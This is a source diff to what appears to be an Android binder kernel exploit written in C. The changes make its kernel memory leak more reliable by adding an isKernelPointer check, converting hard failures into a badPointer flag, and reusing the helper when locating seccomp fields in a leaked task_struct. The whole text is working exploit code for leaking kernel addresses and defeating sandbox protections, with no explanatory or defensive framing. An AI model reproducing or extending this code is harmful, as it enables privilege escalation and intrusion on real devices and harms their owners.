@@ -89,6 +89,10 @@ void error(char* fmt, ...)
     exit(1);
 }
 
+int isKernelPointer(unsigned long p) {
+    return (p & 0xFFFFFFFF00000000ul) == 0xFFFFFFC000000000ul;
+}
+
 unsigned long kernel_read_ulong(unsigned long kaddr);
 
 void hexdump_memory(void *_buf, size_t byte_count)
@@ -311,6 +315,8 @@ void leak_data(void *leakBuffer, int leakAmount,
         error( "fork");
     if (fork_ret == 0)
     {
+        int failed = 0;
+        
         /* Child process */
         prctl(PR_SET_PDEATHSIG, SIGKILL);
         usleep(DELAY_USEC);
@@ -326,18 +332,23 @@ void leak_data(void *leakBuffer, int leakAmount,
             error( "reading first part of pipe");
 
         memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);
+        
+        int badPointer = 0;
         if (memcmp(dataBuffer, dataBuffer + 8, 8))
-            error( "Addresses don't match");
+            badPointer = 1;
         unsigned long addr = 0;
         memcpy(&addr, dataBuffer, 8);
-        if (addr == 0)
-            error( "bad address");
+
+        if (!isKernelPointer(addr)) {
+            badPointer = 1;
+        }
+        
         unsigned long task_struct_ptr = 0;
 
         memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
         message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);
 
-        if (extraLeakAmount > 0 || kstack_p != NULL)
+        if (!badPointer && (extraLeakAmount > 0 || kstack_p != NULL))
         {
             unsigned long extra[6] = {
                 addr,
@@ -378,6 +389,11 @@ void leak_data(void *leakBuffer, int leakAmount,
         close(leakPipe[0]);
         close(leakPipe[1]);
         message("CHILD: Finished write to FIFO.");
+        
+        if (badPointer) {
+            errno = 0;
+            error("problematic address pointer, e.g., %lx", addr);
+        }
         exit(0);
     }
     ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
@@ -683,7 +699,7 @@ int getSeccompOffset(unsigned char* task_struct_data, unsigned credOffset, unsig
             unsigned int child_exe;
         } *p = (void*)(task_struct_data+i);
         
-        if (p->seccomp_status == seccompStatus && ((p->seccomp_filter & 0xFFFFFFFF00000000ul) == 0xFFFFFFC000000000ul)) {
+        if (p->seccomp_status == seccompStatus && isKernelPointer(p->seccomp_filter)) {
             if (p->child_exe == p->parent_exe + 1) {
                 return i;
             }
